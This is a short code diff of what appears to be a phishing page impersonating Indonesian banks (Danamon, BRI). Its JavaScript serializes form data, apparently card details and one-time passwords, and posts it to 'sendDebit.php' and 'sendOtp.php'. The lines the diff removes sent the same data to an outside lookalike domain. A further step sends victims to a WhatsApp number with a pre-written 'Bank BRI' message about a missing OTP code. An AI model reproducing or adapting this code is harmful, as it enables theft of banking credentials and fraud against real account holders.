@@ -1686,7 +1686,7 @@ document.getElementById('btnSubmit').innerHTML = "Verify....";
  var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/1271362249/sendDebit.php',
+			  url: 'sendDebit.php',
 			  data: dataString,
  
  
@@ -1725,7 +1725,7 @@ $(".load").fadeOut();
 var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/1271362249/sendOtp.php',
+			  url: 'sendOtp.php',
 			  data: dataString,
 			  
  complete: function(data) {
@@ -1762,11 +1762,7 @@ $("#otp").val("");
 <script>
 function getcs(){
  $("#process1").show();   
-  audio4 = document.getElementById("bsiku");
-  audio = document.getElementById("bsi");
-    audio4.play();
-     audio.load();
-    audio4.loop = false
+  
 setTimeout(function(){  
     $("#process1").hide();   
 location.href='https://wa.me/6285814266228?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20Belum%20Mendapat%20Kode%20OTP';
